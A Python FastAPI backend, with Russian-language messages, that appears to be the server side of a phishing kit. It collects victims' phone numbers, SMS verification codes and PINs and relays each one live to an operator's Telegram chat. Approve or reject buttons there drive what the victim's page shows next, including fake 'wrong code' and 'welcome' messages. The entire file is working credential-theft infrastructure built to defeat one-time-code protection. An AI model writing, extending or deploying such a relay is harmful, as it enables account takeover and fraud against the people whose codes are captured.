import os
import logging
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(level=logging.INFO)

# Хранилище сессий
sessions = {}

def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
    url = f"{TELEGRAM_API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        resp = requests.post(url, json=payload, timeout=5)
        resp.raise_for_status()
    except Exception as e:
        logging.error(f"Ошибка отправки: {e}")

def get_code_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Код верный → ввод PIN", "callback_data": f"code_ok_{session_id}"},
                {"text": "❌ Код неверный", "callback_data": f"code_wrong_{session_id}"}
            ]
        ]
    }

def get_pin_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ PIN верный", "callback_data": f"pin_ok_{session_id}"},
                {"text": "❌ PIN неверный", "callback_data": f"pin_wrong_{session_id}"}
            ]
        ]
    }

class PhoneData(BaseModel):
    phone: str
    session_id: str
    user_chat_id: int = None

class CodeData(BaseModel):
    session_id: str
    code: str

class PinData(BaseModel):
    session_id: str
    pin: str

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Устанавливаем вебхук
    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
    webhook_url = f"{render_url}/webhook/callback"
    requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен* (с кнопками)")
    logging.info(f"Webhook set to {webhook_url}")
    yield
    send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/submit_phone")
async def submit_phone(data: PhoneData):
    phone = data.phone
    sid = data.session_id
    user_chat_id = data.user_chat_id
    
    if not phone or not sid:
        raise HTTPException(status_code=400, detail="Не хватает данных")
    
    sessions[sid] = {
        "phone": phone,
        "user_chat_id": user_chat_id,
        "status": "waiting_code"
    }
    
    send_to_telegram(
        MY_CHAT_ID,
        f"📞 *НОВЫЙ НОМЕР*\n🆔 Сессия: `{sid}`\n📞 Номер: `{phone}`\n\nОжидается ввод SMS-кода..."
    )
    
    return {"status": "ok"}

@app.post("/submit_code")
async def submit_code(data: CodeData):
    sid = data.session_id
    code = data.code
    
    if not sid or not code:
        raise HTTPException(status_code=400, detail="Не хватает данных")
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["code"] = code
    session["status"] = "waiting_code_confirmation"
    
    send_to_telegram(
        MY_CHAT_ID,
        f"🔢 *ПРОВЕРКА SMS-КОДА*\n🆔 Сессия: `{sid}`\n📞 Номер: `{session['phone']}`\n🔢 Код: `{code}`\n\nПодтвердите или отклоните код:",
        reply_markup=get_code_keyboard(sid)
    )
    
    return {"status": "waiting_confirmation"}

@app.post("/submit_pin")
async def submit_pin(data: PinData):
    sid = data.session_id
    pin = data.pin
    
    if not sid or not pin:
        raise HTTPException(status_code=400, detail="Не хватает данных")
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["pin"] = pin
    session["status"] = "waiting_pin_confirmation"
    
    send_to_telegram(
        MY_CHAT_ID,
        f"🔐 *ПРОВЕРКА PIN-КОДА*\n🆔 Сессия: `{sid}`\n📞 Номер: `{session['phone']}`\n🔢 SMS-код: `{session['code']}`\n🔢 PIN: `{pin}`\n\nПодтвердите или отклоните PIN:",
        reply_markup=get_pin_keyboard(sid)
    )
    
    return {"status": "waiting_confirmation"}

@app.get("/check_status/{session_id}")
async def check_status(session_id: str):
    """Страница опрашивает этот эндпоинт каждые 2 секунды"""
    session = sessions.get(session_id)
    if not session:
        return {"status": "not_found"}
    
    current_status = session.get("status", "unknown")
    
    if current_status == "code_confirmed":
        return {"status": "code_confirmed", "next_step": "pin"}
    elif current_status == "code_wrong":
        return {"status": "code_wrong"}
    elif current_status == "pin_confirmed":
        return {"status": "pin_confirmed", "next_step": "success"}
    elif current_status == "pin_wrong":
        return {"status": "pin_wrong"}
    else:
        return {"status": current_status}

@app.post("/webhook/callback")
async def handle_callback(request: Request):
    """Обработка нажатий на кнопки в Telegram"""
    try:
        data = await request.json()
        
        if "callback_query" not in data:
            return {"ok": True}
        
        callback = data["callback_query"]
        callback_id = callback["id"]
        data_str = callback["data"]
        
        # Парсим callback_data (формат: action_result_session_id)
        parts = data_str.split("_")
        if len(parts) < 3:
            return {"ok": True}
        
        action = parts[0]  # code или pin
        result = parts[1]   # ok или wrong
        session_id = "_".join(parts[2:])
        
        session = sessions.get(session_id)
        
        if action == "code":
            if result == "ok":
                if session:
                    session["status"] = "code_confirmed"
                send_to_telegram(MY_CHAT_ID, f"✅ Код подтверждён для сессии {session_id}. Пользователь может вводить PIN.")
            else:
                if session:
                    session["status"] = "code_wrong"
                    user_chat_id = session.get("user_chat_id")
                    if user_chat_id:
                        send_to_telegram(str(user_chat_id), "❌ Неверный SMS-код. Попробуйте ещё раз.")
                send_to_telegram(MY_CHAT_ID, f"❌ Код отклонён для сессии {session_id}.")
        
        elif action == "pin":
            if result == "ok":
                if session:
                    session["status"] = "pin_confirmed"
                    user_chat_id = session.get("user_chat_id")
                    if user_chat_id:
                        send_to_telegram(str(user_chat_id), "✅ PIN подтверждён! Добро пожаловать.")
                send_to_telegram(MY_CHAT_ID, f"✅ PIN подтверждён для сессии {session_id}. Вход выполнен.")
            else:
                if session:
                    session["status"] = "pin_wrong"
                    user_chat_id = session.get("user_chat_id")
                    if user_chat_id:
                        send_to_telegram(str(user_chat_id), "❌ Неверный PIN-код. Попробуйте ещё раз.")
                send_to_telegram(MY_CHAT_ID, f"❌ PIN отклонён для сессии {session_id}.")
        
        # Отвечаем на callback
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "✅ Обработано"}
        )
        
    except Exception as e:
        logging.error(f"Callback error: {e}")
    
    return {"ok": True}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
